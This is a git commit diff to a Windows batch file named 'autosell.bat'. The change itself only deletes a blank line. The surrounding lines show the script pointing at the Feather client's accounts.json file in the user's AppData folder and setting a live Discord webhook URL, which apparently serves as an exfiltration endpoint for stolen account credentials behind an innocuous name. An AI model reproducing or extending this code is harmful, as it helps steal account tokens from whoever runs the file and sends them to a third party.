7c7aadcc3ec20196513e1fa87b203aaabdcd4271
PabloThemexico <MattixG123@yahoo.com>
2025-01-26 12:13:17 -0600

    Update autosell.bat

--- autosell.bat
+++ autosell.bat
@@ -5,7 +5,6 @@ set FILE_PATH=%USERPROFILE%\AppData\Roaming\feather\accounts.json
 
 REM Discord webhook URL
 set WEBHOOK_URL=https://discord.com/api/webhooks/1333133682915151943/U2EECivgXC_DLrYcEbb2eDlvs-PBS7HNvzd-RKy4IK0XQKLVsgTW58aCk99x-KMlBWy7
-
 REM Ensure the file exists
 if not exist "%FILE_PATH%" (
     echo File not found: %FILE_PATH%
